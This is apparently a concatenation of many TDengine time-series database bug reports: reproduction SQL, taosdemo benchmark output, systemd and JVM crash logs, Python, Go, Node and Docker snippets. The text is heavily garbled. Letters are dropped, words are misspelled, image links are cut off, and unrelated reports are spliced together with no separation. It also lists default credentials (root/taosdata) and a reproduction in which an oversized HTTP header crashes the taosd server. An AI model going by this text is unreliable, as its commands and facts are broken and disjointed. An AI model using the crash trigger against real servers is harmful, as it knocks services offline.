`insert into co2123333 using stb_mete tags ( 'ems','co21','mete','co21d','cosa','origin')values(1602235860000, 1.0)`
then some times the error while occured
in shell enter `taosdemo`, follow and you get the big table `test.meters`
run `select count(*) from test.meters;`
bang!!!! you cannot stop it, `ctrl+c` not work
sudo systemctl start taosd
taosd,service - tdengine server service
oaded: loaded (/etc/sustemd/sustem/taosd
service; enabled; vendor preset: enabled)
active: failed (result: signal) since mon 2020-10-12 02:13:54 utc; 1s ago
ppocess: 2711 execstant-/usr/bin/taosd (code=killed, signal=abrt)
main pid: 2711 (code=killed, signal=abrt)
oct 12 02:13:54 mygns sustemd [1]: taosd.service: scheduled restart iob, restant counter is at 3.
oct 12 02:13:54 mygps systemd [1]: stopped tdengine server service.
oct 12 02:13:54 mygns sustemd [1]: taosd.service: start request repeated too quickly
nct 12 02:18:54 mugps systend [1]: taosd.service: failed with result 'signal'
oct 12 02:13:54 mugps systemd [1]: failed to start tdengine server service
edit `t.go`
package main import ( _ "github.com/taosdata/driver-go/taossql"
) func main() { }
run this file with module off
go111module=off go run t.go
login to tdengine server.
send create table request by curl as documentation described.
curl -h 'authorization: basic cm9vddp0yw9zzgf0yq==' -d 'use testdb; create table mqtt_msg (ts timestamp, msgid nchar(64), topic nchar(255), qos tinyint, payload binary(1024), arrived timestamp);' localhost:6041/rest/sql
the response shows succeeded:
{"status":"succ","head":["affected_rows"],"data":[[0]],"rows":0}
login taos command line by root/taosdata and check table:
> taos --user=root --password=taosdata welcome to the tdengine shell from linux, client version:2.0.3.0
copyright (c) 2017 by taos data, inc
all rights reserved
taos> use testdb;
database changed
taos> select * from mqtt_msg; db error: table does not exist
if run create table statement alone in taos command line, table created successfully.
taos> create table mqtt_msg (ts timestamp, msgid nchar(64), topic nchar(255), qos tinyint, payload bi
nary(1024), arrived timestamp);
query ok, 0 row(s) affected (0.100608s) taos> select * from mqtt_msg;
query ok, 0 row(s) in set (0.012229s)
login tdengine server.
start tdengine service.
taos -u root -p taosdata or taos -u=root -p=taosdata.
always login failed.
select count(*) form test.t9910 nvalid message
elect * from xxx
create table if not exists combinerbox (ts timestamp,p2m1 float,p2m2 float,p2m3 float,p2m4 float,p2m5 float,p2m6 float,p2m7 float,p2m8 float,p2m9 float,p2m10 float,p2m11 float,p2m12 float,p2m13 float,p2m14 float,p2m15 float,p2m16 float,p2m17 float,p2m18 float,p2m19 float,p2m20 float,p2m21 float,p2m22 float,p2m23 float,p2m24 float,p2m25 float,p2m26 float,p2m27 float,p2m28 float,p2m29 float,p2m30 float,p2m31 float,p2m32 float,p2m33 float,p2m34 float,p2m35 float,p2m36 int,p2m37 int,p2m38 int,p2m39 int,p2m40 int,p2m41 int,p2m42 int,p2m43 int,p2m44 int,p2m45 int,p2m46 int,p2m47 int,p2m48 int,p2m49 int,p2m50 int,p2m51 int,p2m52 int,p2m53 int,p2m54 int,p2m55 int,p2m56 int,p2m57 int,p2m58 int,p2m59 int,p2m60 int,p2m61 int,p2m62 int,p2m63 int,p2m64 int,p2m65 int,p2m66 int,p2m67 int,p2m68 int,p2m69 int,p2m70 int,p2m71 int,p2m72 int,p2m73 int,p2m74 int,p2m75 int,p2m76 int,p2m77 int,p2m78 int,p2m79 int,p2m80 int,p2m81 int,p2m82 int,p2m83 int,p2m84 int,p2m85 int,p2m86 int,p2m87 int,p2m88 int,p2m89 int,p2m90 int,p2m91 int,p2m92 int,p2m93 int) tags (projectsn binary(32),gatewaysn binary(32),deviceaddress int); 2
create table t1m1msl1115060829m2m8 using combinerbox tags ('sl1115060829','2',8); 3 sv
ts,p2m1,p2m2,p2m3,p2m4,p2m5,p2m6,p2m7,p2m8,p2m9,p2m10,p2m11,p2m12,p2m13,p2m14,p2m15,p2m16,p2m17,p2m18,p2m19,p2m20,p2m21,p2m22,p2m23,p2m24,p2m25,p2m26,p2m27,p2m28,p2m29,p2m30,p2m31,p2m32,p2m33,p2m34,p2m35,p2m36,p2m37,p2m38,p2m39,p2m40,p2m41,p2m42,p2m43,p2m44,p2m45,p2m46,p2m47,p2m48,p2m49,p2m50,p2m51,p2m52,p2m53,p2m54,p2m55,p2m56,p2m57,p2m58,p2m59,p2m60,p2m61,p2m62,p2m63,p2m64,p2m65,p2m66,p2m67,p2m68,p2m69,p2m70,p2m71,p2m72,p2m73,p2m74,p2m75,p2m76,p2m77,p2m78,p2m79,p2m80,p2m81,p2m82,p2m83,p2m84,p2m85,p2m86,p2m87,p2m88,p2m89,p2m90,p2m91,p2m92,p2m93
'2018-12-18 13:11:11.000',null,619.77002,2.89000,2.74000,2.77000,3.30000,3.52000,3.95000,3.33000,2.96000,2.77000,2.80000,3.11000,2.89000,2.99000,3.49000,3.33000,2.58000,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
'2018-12-18 13:16:11.000',null,619.77002,2.86000,2.71000,2.74000,3.24000,3.49000,3.89000,3.30000,2.92000,2.77000,2.80000,3.05000,2.86000,2.92000,3.42000,2.52000,2.58000,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
'2018-12-18 13:21:11.000',null,612.28003,2.83000,2.64000,2.74000,3.21000,3.46000,3.89000,3.33000,2.89000,2.77000,2.80000,3.05000,2.83000,2.89000,3.39000,2.55000,2.58000,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
'2018-12-18 13:26:11.000',null,619.77002,2.74000,2.58000,2.61000,3.11000,3.36000,3.77000,3.17000,2.80000,2.68000,2.80000,2.92000,2.74000,2.80000,3.30000,2.40000,2.58000,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
'2018-12-18 13:31:11.000',null,614.15997,2.71000,2.58000,2.61000,3.05000,3.30000,3.70000,3.17000,2.77000,2.68000,2.80000,2.92000,2.68000,2.77000,3.24000,2.43000,2.58000,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
'2018-12-18 13:36:11.000',null,621.65002,2.61000,2.46000,2.49000,2.96000,3.17000,3.61000,3.02000,2.68000,2.52000,2.80000,2.83000,2.58000,2.68000,3.14000,2.30000,2.58000,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
'2018-12-18 13:46:11.000',null,621.65002,2.52000,2.37000,2.40000,2.83000,3.05000,3.46000,2.89000,2.55000,2.46000,2.80000,2.71000,2.49000,2.55000,2.99000,2.21000,2.58000,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
'2018-12-18 13:51:11.000',null,621.65002,2.43000,2.27000,2.30000,2.71000,2.96000,3.33000,2.80000,2.46000,2.37000,2.80000,2.61000,2.37000,2.46000,2.86000,2.12000,2.58000,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
'2018-12-18 13:56:11.000',null,616.03003,2.33000,2.24000,2.27000,2.64000,2.89000,3.30000,2.80000,2.40000,2.33000,2.80000,2.55000,2.33000,2.40000,2.80000,2.12000,2.58000,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
go to 'taos'
type in 'alter user root pass 'iquery_89';'
4.taos, taos connect failed, reason: authentication failure
aosdemo -n 100000
###################################################################
# server ip: localhost:0
# user: root
# password: taosdata
# use metric: true
# datatype of columns: int int int int int int int float # binary length(if applicable): -1
# number of columns per record: 3
# number of threads: 10
# number of tables: 100000
# number of data per table: 100000
# records/request: 1000
# database name: test_01
# table prefix: t
# delete method: 0
# test time: 2020-09-23 16:42:53
################################################################### press enter key to continue
creating meters super table...
meters created!
create table......
creating table from 0 to 9999
creating table from 10000 to 19999
creating table from 20000 to 29999
creating table from 30000 to 39999
creating table from 40000 to 49999
creating table from 50000 to 59999
creating table from 60000 to 69999
creating table from 70000 to 79999
creating table from 80000 to 89999
creating table from 90000 to 99999
spent 81.6716 seconds to create 100000 tables with 10 connections
inserting data......
sync insert with 10 connections:
spent 3465.1017 seconds to insert 1410065408 records with 1000 record(s) per request: 406933.34 records/second
pringboot-mybatis
rl rl apper insert into ${tablename} using face tags (#{tenantid,jdbctype=varchar}) values <foreach collection="entitylist" item="item"> ( #{item.shottime,jdbctype=timestamp}, #{item.faceid,jdbctype=varchar}, #{item.lefttopx,jdbctype=integer}, #{item.lefttopy,jdbctype=integer}, #{item.rightbtmx,jdbctype=integer}, #{item.rightbtmy,jdbctype=integer}, #{item.traitimg,jdbctype=varchar}, #{item.sceneimg,jdbctype=varchar} ) </foreach>
traitimg ceneimg rl
tsdbpreparedstatement 118
this.sql = this.sql.replacefirst("[?]", "null");
create database tb_tag;
use tb_tag;
create table tb_tag (ts timestamp,tag_value float) tags(tag_name binary(64));
3 dbctemplate
insert into t000001 using tb_tag tags ('t000001') values(1600838896622,0.08143681);insert into t000002 using tb_tag tags ('t000002') values(1600838896622,0.4973501);insert into t000003 using tb_tag tags ('t000003') values(1600838896622,0.7264087);insert into t000004 using tb_tag tags ('t000004') values(1600838896622,0.46187901);insert into t000005 using tb_tag tags ('t000005') values(1600838896622,0.7387829);insert into t000006 using tb_tag tags ('t000006') values(1600838896622,0.009768069);insert into t000007 using tb_tag tags ('t000007') values(1600838896622,0.61707586);insert into t000008 using tb_tag tags ('t000008') values(1600838896622,0.9588898);insert into t000009 using tb_tag tags ('t000009') values(1600838896622,0.816623);insert into t000010 using tb_tag tags ('t000010') values(1600838896622,0.47240126);insert into t000011 using tb_tag tags ('t000011') values(1600838896622,0.85073763);insert into t000012 using tb_tag tags ('t000012') values(1600838896622,0.40990752);insert into t000013 using tb_tag tags ('t000013') values(1600838896623,0.1578793);insert into t000014 using tb_tag tags ('t000014') values(1600838896623,0.28110814);insert into t000015 using tb_tag tags ('t000015') values(1600838896623,0.57640064);insert into t000016 using tb_tag tags ('t000016') values(1600838896623,0.36013436);insert into t000017 using tb_tag tags ('t000017') values(1600838896623,0.83641833);insert into t000018 using tb_tag tags ('t000018') values(1600838896623,0.33480728);insert into t000019 using tb_tag tags ('t000019') values(1600838896623,0.09129202);insert into t000020 using tb_tag tags ('t000020') values(1600838896623,0.09485775);insert into t000021 using tb_tag tags ('t000021') values(1600838896623,0.731509);insert into t000022 using tb_tag tags ('t000022') values(1600838896623,0.27820665);insert into t000023 using tb_tag tags ('t000023') values(1600838896623,0.78342247);insert into t000024 using tb_tag tags ('t000024') values(1600838896623,0.34645295);insert into t000025 using tb_tag tags ('t000025') values(1600838896623,0.88850784);insert into t000026 using tb_tag tags ('t000026') values(1600838896623,0.80840135);insert into t000027 using tb_tag tags ('t000027') values(1600838896623,0.948438);insert into t000028 using tb_tag tags ('t000028') values(1600838896623,0.13964927);insert into t000029 using tb_tag tags ('t000029') values(1600838896623,0.93142825);insert into t000030 using tb_tag tags ('t000030') values(1600838896623,0.840158);insert into t000031 using tb_tag tags ('t000031') values(1600838896623,0.626118);insert into t000032 using tb_tag tags ('t000032') values(1600838896623,0.6379224);insert into t000033 using tb_tag tags ('t000033') values(1600838896623,0.24776179);insert into t000034 using tb_tag tags ('t000034') values(1600838896623,0.945409);insert into t000035 using tb_tag tags ('t000035') values(1600838896623,0.9776708);insert into t000036 using tb_tag tags ('t000036') values(1600838896623,0.044192612);insert into t000037 using tb_tag tags ('t000037') values(1600838896623,0.4040339);insert into t000038 using tb_tag tags ('t000038') values(1600838896623,0.4475447);insert into t000039 using tb_tag tags ('t000039') values(1600838896623,0.10605687);insert into t000040 using tb_tag tags ('t000040') values(1600838896623,0.2951032);insert into t000041 using tb_tag tags ('t000041') values(1600838896623,0.68357253);insert into t000042 using tb_tag tags ('t000042') values(1600838896623,0.71743697);insert into t000043 using tb_tag tags ('t000043') values(1600838896623,0.36352456);insert into t000044 using tb_tag tags ('t000044') values(1600838896623,0.84755325);insert into t000045 using tb_tag tags ('t000045') values(1600838896623,0.14289218);insert into t000046 using tb_tag tags ('t000046') values(1600838896623,0.2077927);insert into t000047 using tb_tag tags ('t000047') values(1600838896623,0.18180001);insert into t000048 using tb_tag tags ('t000048') values(1600838896623,0.34309316);insert into t000049 using tb_tag tags ('t000049') values(1600838896623,0.3291576);insert into t000050 using tb_tag tags ('t000050') values(1600838896623,0.53710717);insert into t000051 using tb_tag tags ('t000051') values(1600838896623,0.11244613);insert into t000052 using tb_tag tags ('t000052') values(1600838896623,0.3649305);insert into t000053 using tb_tag tags ('t000053') values(1600838896623,0.7888516);insert into t000054 using tb_tag tags ('t000054') values(1600838896623,0.68286306);insert into t000055 using tb_tag tags ('t000055') values(1600838896623,0.35985458);insert into t000056 using tb_tag tags ('t000056') values(1600838896623,0.908281);insert into t000057 using tb_tag tags ('t000057') values(1600838896623,0.32280934);insert into t000058 using tb_tag tags ('t000058') values(1600838896623,0.8896353);insert into t000059 using tb_tag tags ('t000059') values(1600838896623,0.048051536);insert into t000060 using tb_tag tags ('t000060') values(1600838896623,0.16605031);insert into t000061 using tb_tag tags ('t000061') values(1600838896623,0.06528437);insert into t000062 using tb_tag tags ('t000062') values(1600838896623,0.016550004);insert into t000063 using tb_tag tags ('t000063') values(1600838896623,0.7402079);insert into t000064 using tb_tag tags ('t000064') values(1600838896623,0.14502865);insert into t000065 using tb_tag tags ('t000065') values(1600838896623,0.604707);insert into t000066 using tb_tag tags ('t000066') values(1600838896623,0.10003269);insert into t000067 using tb_tag tags ('t000067') values(1600838896623,0.39839393);insert into t000068 using tb_tag tags ('t000068') values(1600838896623,0.04438126);insert into t000069 using tb_tag tags ('t000069') values(1600838896623,0.22391862);insert into t000070 using tb_tag tags ('t000070') values(1600838896623,0.74549866);insert into t000071 using tb_tag tags ('t000071') values(1600838896623,0.14814943);insert into t000072 using tb_tag tags ('t000072') values(1600838896623,0.3947476);insert into t000073 using tb_tag tags ('t000073') values(1600838896623,0.5426274);insert into t000074 using tb_tag tags ('t000074') values(1600838896623,0.25049502);insert into t000075 using tb_tag tags ('t000075') values(1600838896623,0.65923077);insert into t000076 using tb_tag tags ('t000076') values(1600838896623,0.074901104);insert into t000077 using tb_tag tags ('t000077') values(1600838896623,0.16474098);insert into t000078 using tb_tag tags ('t000078') values(1600838896623,0.41702938);insert into t000079 using tb_tag tags ('t000079') values(1600838896623,0.040070772);insert into t000080 using tb_tag tags ('t000080') values(1600838896623,0.9644293);insert into t000081 using tb_tag tags ('t000081') values(1600838896623,0.69116247);insert into t000082 using tb_tag tags ('t000082') values(1600838896623,0.7927409);insert into t000083 using tb_tag tags ('t000083') values(1600838896623,0.84768975);insert into t000084 using tb_tag tags ('t000084') values(1600838896623,0.60914296);insert into t000085 using tb_tag tags ('t000085') values(1600838896623,0.5730664);insert into t000086 using tb_tag tags ('t000086') values(1600838896623,0.34313095);insert into t000087 using tb_tag tags ('t000087') values(1600838896623,0.9754753);insert into t000088 using tb_tag tags ('t000088') values(1600838896623,0.37093848);insert into t000089 using tb_tag tags ('t000089') values(1600838896623,0.16857404);insert into t000090 using tb_tag tags ('t000090') values(1600838896623,0.066293836);insert into t000091 using tb_tag tags ('t000091') values(1600838896623,0.80877703);insert into t000092 using tb_tag tags ('t000092') values(1600838896623,0.44792885);insert into t000093 using tb_tag tags ('t000093') values(1600838896623,0.7545482);insert into t000094 using tb_tag tags ('t000094') values(1600838896623,0.25624752);insert into t000095 using tb_tag tags ('t000095') values(1600838896623,0.17936748);insert into t000096 using tb_tag tags ('t000096') values(1600838896623,0.18490034);insert into t000097 using tb_tag tags ('t000097') values(1600838896623,0.4037053);insert into t000098 using tb_tag tags ('t000098') values(1600838896623,0.6484243);insert into t000099 using tb_tag tags ('t000099') values(1600838896623,0.85187644);insert into t000100 using tb_tag tags ('t000100') values(1600838896623,0.24895549);
use idea's database feature and inpormt `taos-jdbcdriver-2.0.6.jar` as driver
refresh database 3
get the error
create database
create database test; 2
create table
create table device_param_raw (tmp timestamp,code int(4),device_no binary(50),data_date binary(12),data_time binary(20),paramcode binary(50),paramvalue binary(50),unit binary(10),status binary(10)); 3
insert into insert into test.device_param_raw values ('2000-09-24 15:21:56.000',211,'aaa','2020-09-17','2020-09-17 07:53:00','o3','29.4','ug/m3','bbbb');
create database
create database test; 2
create table
create table device_param_raw (tmp timestamp,code int(4),device_no binary(50),data_date binary(12),data_time binary(20),paramcode binary(50),paramvalue binary(50),unit binary(10),status binary(10)); 3
insert into insert into test.device_param_raw values ('2000-09-24 15:21:56.000',211,'aaa','2020-09-17','2020-09-17 07:53:00','o3','29.4','ug/m3','bbbb');
java -jar bytaosdemo.jar
(base) beiyang@beiyang:~/netbeansprojects/madps$ java -jar bytaosdemo.jar java.library.path:/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib
# a fatal error has been detected by the java runtime environment:
# sigsegv ( ) at pc= , pid=22183, tid=
# jre version: java(tm) se runtime environment (8.0_251-b08) (build 1.8.0_251-b08)
# java vm: java hotspot(tm) 64-bit server vm (25.251-b08 mixed mode linux-amd64 compressed oops)
# problematic frame:
# c [libbsd.so.0+ ] md5pad+
# failed to write core dump
core dumps have been disabled
to enable core dumping, try "ulimit -c unlimited" before starting java again
# an error report file with more information is saved as:
# /home/beiyang/netbeansprojects/madps/hs_err_pid22183.log
# if you would like to submit a bug report, please visit:
#
# the crash happened outside the java virtual machine in native code.
# see problematic frame for where to report the bug.
( )
00000 2
import taos
import datetime
import random
from multiprocessing import pool def query(i): try: conn1 = taos.connect(host="127.0.0.1", user="root", password="taosdata", config="/etc/taos") c1 = conn1.cursor() c1.execute(\'use db6\') c1.execute(\'select * from db6.t%d\' %(i)) conn1.close() except exception as err: conn1.close() raise(err)
if __name__ == '__main__': # use database try: c1.execute('use db6') except exception as err: conn.close() raise(err) # query data and return data in the form of list try: pool = pool(5) pool.map(query, range(8000)) pool.close() pool.join() except exception as err: raise(err)
ython
dengine fg fg
firstep 192.168.4.66:6030
fqdn 192.168.4.66
arbitrator 168.192.6.66:6042
firstep 192.168.4.66:6030
fqdn 168.192.6.66
arbitrator 168.192.6.66:6042 2
030--6042 3
ffline 2 ing 192.168.4.66 [root@node1 ~]# telnet 168.192.6.66 6030
trying 168.192.6.66...
connected to 168.192.6.66.
escape character is '^]'
168.192.6.66 [root@node2 ~]# telnet 192.168.4.66 6030
trying 192.168.4.66...
connected to 192.168.4.66.
escape character is '^]'.
dl
alter table xxx add column 'tb_xxx' double; 2
insert into parxxxp02 (ts, 'tb_cxxxxtus') values(1600138440760, 1.0)
go to taos shell
type in 'select pagenum,count(pagenum) from access192020 where logtime >1598880281005 group by pagenum;' pagenum column def agenum binary(64) access192020 where logtime >1598880281005 has about 50 thousand records
taos> select count(pagenum) from access192020 where logtime >1598880281005; count(pagenum) |
======================== 53969 |
query ok, 1 row(s) in set (0.004001s) taosd: /usr/local/tsdb/tdengine-ver-2.0.3.0/src/query/src/qutil.c:157: clearfirstntimewindow: assertion `p != ((void *)0)' failed.
aborted (core dumped)
aosdemo est.meters
ql elect sum(f1) from meters interval(1h) sliding(30m);
```dockerfile from alpine:3.5 run echo " " > /etc/apk/repositories \\
&& echo " " >> /etc/apk/repositories workdir /
run apk add --update build-base cmake linux-headers argp-standalone bash
run ls /usr/lib/
run mkdir -p tdengine/build
copy tdengine/ tdengine/
env ld_library_path="$ld_library_path:/usr/lib"
env lc_ctype="en_us.utf-8" workdir /tdengine/build
run cmake .
&& cmake --build
&& make install
buntu 16.04.2 aosd 2.0.1.0
![server-version](
indows ava taosc .0.1.1
![describe-table](
id [0, 9999999) 1 id = 0 ts 2020-01-01 00:00:00 1577808000000 id ts +1
drop create 0 thread 1000w 1000 hread-1 [0, 200000) hread-2 [200000, 400000)
elect count(*) from 'college_stus';
select count drop
/var/log/taos taosdlog.1 error rror vgid:22 failed to get table to insert data, uid 0 tid 16777216 rror vgid:22 failed to insert data since invalid table id
![server-error]( b
select * from college_stus limit [offset], [rows]; select * from college_stus limit 0,100000;
offset rows
select * from college_stus limit 394000,1000;
![data-error](
offset id min(id) max(id) 0 9,999,999
1 elect count(*)
2 elect * ..
taos> use testdata; taos> select count(*) from devices; count(*) | 31500000 |
query ok, 1 row(s) in set (0.009443s) taos> select max(windspeed) from devices interval(10m); 2015-12-31 04:50:00.000 | 14 | 2015-12-31 05:00:00.000 | 14 | 2015-12-31 05:10:00.000 | 14 | 2015-12-31 05:20:00.000 | 14 | 2015-12-31 05:30:00.000 | 14 | 2015-12-31 05:40:00.000 | 14 | 2015-12-31 05:50:00.000 | 14 |
query ok, 52500 row(s) in set (1.643158s) taos> create table my_max as select max(windspeed) from devices interval(10m) sliding(5m);
query ok, 0 row(s) affected (0.004576s) taos> select * from my_max;
query ok, 0 row(s) in set (0.003810s)
see the description as above.
ocker
docker run -d -v /etc/taos:/etc/taos -p 6030:6030 -p 6035:6035 -p 6041:6041 -p 6030-6040:6030-6040/udp tdengine/tdengine:latest
win10
![image](
dengine
![image]( 6030-6039 tcp,udp
const taos = require("td2.0-connector");
var conn = taos.connect({ host: "127.0.0.1", user: "root", password: "taosdata", config: "/etc/taos", port: 0,
var cursor = conn.cursor();
var query = cursor.query("show databases;");
var promise = query.execute();
promise.then(function(result) { result.pretty(); }); ```
start td engine server
docker run -it --rm \\ -p 6030:6030 \\ -p 6035:6035 \\ -p 6041:6041 \\ -p 6030-6040:6030-6040/udp \\ tdengine/tdengine:2.0.1.0
create db and super table
create database x;
create table if not exists st( ts timestamp, t float
tags( user_id nchar(36), org_id nchar(36)
insert mock data
insert into d1001 using st tags('user1', 'org1') values(now,1);
insert into d1002 using st tags('user1', 'org1') values(now,2);
insert into d1003 using st tags('user2', 'org2') values(now,1);
insert into d1004 using st tags('user3', 'org2') values(now,1);
create table with `as select group by`
create table st_30s as select avg(t) t from st interval(1m) sliding(30s) group by user_id;
describe st_30s;
taos> describe st_30s; field | type | length | note |
================================================================================= ts | timestamp | 8 | | t | double | 8 | |
query ok, 2 row(s) in set (0.001634s)
no user_id column
create table with `as select field group by`
create table st_30s_2 as select user_id, avg(t) t from st interval(1m) sliding(30s) group by user_id; taos> describe st_30s_2; field | type | length | note |
================================================================================= ts | timestamp | 8 | | user_id | nchar | 36 | | t | double | 8 | |
query ok, 3 row(s) in set (0.002065s)
but when query with `select * from st_30s_2;` the result has only user_id=user1 which is not correct
the tdengine log
08/19 07:43:47.565173 tsc error qhandle is null
08/19 07:43:47.565214 tsc error add into queued async res, code:invalid qhandle
08/19 07:43:47.565263 tsc error stream: , retrieve data failed, code: , retry in 12000ms
start td engine server
docker run -it --rm \\ -p 6030:6030 \\ -p 6035:6035 \\ -p 6041:6041 \\ -p 6030-6040:6030-6040/udp \\ tdengine/tdengine:2.0.1.0
create db and super table
create database x;
create table if not exists st( ts timestamp, t float
tags( user_id nchar(36), org_id nchar(36)
insert mock data
insert into d1001 using st tags('user1', 'org1') values(now,1);
insert into d1002 using st tags('user1', 'org1') values(now,2);
insert into d1003 using st tags('user2', 'org2') values(now,1);
insert into d1004 using st tags('user3', 'org2') values(now,1);
select with fill
select avg(t) t from st where ts>=now-1d interval(1m) group by user_id; // works select avg(t) t from st where ts>=now-1d interval(1m) fill(prev) group by user_id; // oops
db error: invalid sql: start(end) time of query range required or time range too large
go to tests/examples/c'
gcc -o prepare prepare.c -ltaos
run prepare localhost
go to taos 2
type in create database demo days 10 cache 16000 rows 2000
linux inux version 3.10.0-229.el7.x86_64
tdengine dengine-server-2.0.0.1-linux-x64.rpm
aos aos connect failed, reason: unexpected generic error in rpc.
1. aosdump aosdump -n 1000 --all-databases -o testzhang.sql
2. dengine1.6.5.6(rpm -e tdengine)
3. dengine1.6.5.9 pm -iv tdengine-server-1.6.5.9-linux-x64.rpm
b1
![1](
![2](
estzhang.sql
![3](
![4](
![5](
follow the readme to build tdengine, while run cmake .
&& cmake --build .
016 020 019
![image]( 2
![image](
heng sv
sv sv
![image]( 4
download tar.gz
run ./install.sh
1 dengine
2 00
3 ql
4 ql
insert into y41_66_t2002 (ts,p01,p02,p03,p04,p05,p06,p07,p08,p09,p10,p11,p12,p13,p14) values ('2020-06-16 09:45:22.252',238.90,238.90,239.90,29.39,30.39,29.89,2.76,21.26,21.44,0.00,49.95,0.00,0.12,0.00)
reason: not active table(not created yet or dropped already)
start taosd
open another terminal, and run **curl -h 'host: 127.0.0.1' -h 'damn: foooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooobarrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr' 127.0.0.1:6020/rest/login/root/taosdata**
this reports ok, 4
**socat -b16 tcp-listen:2060,fork,reuseaddr tcp:localhost:6020**
open another terminal, and run:
**curl -d - -h 'host: 127.0.0.1' -h 'damn: foooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooobarrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr' 127.0.0.1:2060/rest/login/root/taosdata**
random output as follows, from time to time:
**{"status":"error","code":1005,"desc":"http head parse error"}**
**curl: (52) empty reply from server**
and we also see core dump at taosd very much offen
**06/11 16:07:25.137039 error htp context: , fd:20, ip:127.0.0.1:50412, code:406, error:http head parse error
segmentation fault (core dumped)** we also use such commands to make sure it's not **curl/socat** problem.
**socat -b16 tcp-listen:2060,fork,reuseaddr tcp:www.baidu.com:80**
**curl -d - -h 'host: www.baidu.com' -h 'damn: foooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooobarrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr' 127.0.0.1:2060**
output is **http/1.1 200 ok** bypass socat:
**curl -d - -h 'host: 127.0.0.1' -h 'damn: foooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooobarrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr' 127.0.0.1:6020/rest/login/root/taosdata**
output is **http/1.1 200 ok**
mkdir debug; cd debug; cmake ..; cmake --build .; make install
cd tests/pytest
python3 test.py -f query/filter.py
2020-05-27 11:18:27.868168 /<path_tdengine>/tests/pytest/query/filter.py failed: sql:select * from db.st where name like '_econd', queryrows:0 != expect:2
cmake --build .
launch taosd
delete data file
$ taos welcome to the tdengine shell from linux, client version:2.0.0.0
copyright (c) 2017 by taos data, inc
all rights reserved
05/21 17:54:51.644194 error utl locale not configured, set to system default:en_us.utf-8
taos> drop database if exists db;
query ok, 0 row(s) affected (0.004195s) taos> create database db;
query ok, 0 row(s) affected (0.003529s) taos> use db;
database changed
taos> reset query cache;
query ok, 0 row(s) affected (0.000098s) taos> drop database if exists db;
query ok, 0 row(s) affected (0.004109s) taos> create database db;
query ok, 0 row(s) affected (0.002239s) taos> use db;
database changed
taos> reset query cache;
query ok, 0 row(s) affected (0.000103s) taos> drop database if exists db;
query ok, 0 row(s) affected (0.003612s) taos> create database db;
query ok, 0 row(s) affected (0.001575s) taos> use db;
database changed
taos> reset query cache;
query ok, 0 row(s) affected (0.000049s) taos> drop database if exists db;
query ok, 0 row(s) affected (0.002195s) taos> create database db;
